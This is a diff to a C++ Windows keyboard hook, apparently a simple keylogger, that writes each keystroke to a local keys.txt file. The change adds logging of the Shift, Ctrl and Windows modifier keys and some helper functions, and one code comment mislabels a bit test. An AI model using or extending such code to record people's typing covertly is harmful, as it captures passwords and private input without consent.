@@ -1,4 +1,22 @@
 #include "KeyboardHooking.h"
+#include <Windows.h>
+
+
+bool KeyIsDownNow(UINT key)
+{
+	if (GetAsyncKeyState(key) < 0) // higher bit
+		return true;
+	else
+		return false;
+}
+
+bool KeyWasDownBefore(UINT key)
+{
+	if ((GetAsyncKeyState(key) & 0x1) == 0) // higher bit
+		return true;
+	else
+		return false;
+}
 
 void KeyboardHooking::StartKeyboardHooking()
 {
@@ -26,12 +44,11 @@ LRESULT CALLBACK KeyboardHooking::KeyboardProc(int code, WPARAM wParam, LPARAM l
 	key_file.open("keys.txt", std::ios::app);
 	if (!key_file.is_open())
 	{
-		//std::cout << "Could not open the key_file!\n";
+		std::wcout << "Could not open the key_file!\n";
 	}
 
 	std::map <UINT, KeyPair> key;
-	std::map <UINT, KeyPair>::iterator it;
-
+	
 	key[0x03] = KeyPair(VK_CANCEL, "CANCEL");
 	key[0x08] = KeyPair(VK_BACK, "BACKSPACE");
 	key[0x09] = KeyPair(VK_TAB, "TAB");
@@ -159,13 +176,38 @@ LRESULT CALLBACK KeyboardHooking::KeyboardProc(int code, WPARAM wParam, LPARAM l
 	{
 		//get the key from lParam
 		PKBDLLHOOKSTRUCT key_param = (PKBDLLHOOKSTRUCT)lParam; //used for vk_code
-
+		
+		std::map <UINT, KeyPair>::iterator it;
+		
 		it = key.find(key_param->vkCode);
 		if (it == key.end())
-			key_file << " [UNDEFINED: vk_code is " << std::to_string(key_param->vkCode) << "]";
- 		else
+		{
+			key_file << " vk_code: " << std::to_string(key_param->vkCode);
+
+		}
+		else
+		{
+			if ((GetKeyState(VK_SHIFT) & 0x8000)
+				|| (GetKeyState(VK_LSHIFT) & 0x8000)
+				|| (GetKeyState(VK_RSHIFT) & 0x8000))
+
+				key_file << "SHIFT ";
+
+			if ((GetKeyState(VK_CONTROL) & 0x8000)
+				|| (GetKeyState(VK_LCONTROL) & 0x8000)
+				|| (GetKeyState(VK_RCONTROL) & 0x8000))
+
+				key_file << "CTRL ";
+
+			if ((GetKeyState(VK_LWIN) & 0x8000)
+				|| (GetKeyState(VK_RWIN) & 0x8000))
+
+				key_file << "WIN ";
+
 			key_file << (it->second).GetKeyName() << " ";
+		}	
 	}
+
 	key_file.close();
 	return CallNextHookEx(NULL, code, wParam, lParam);
 }
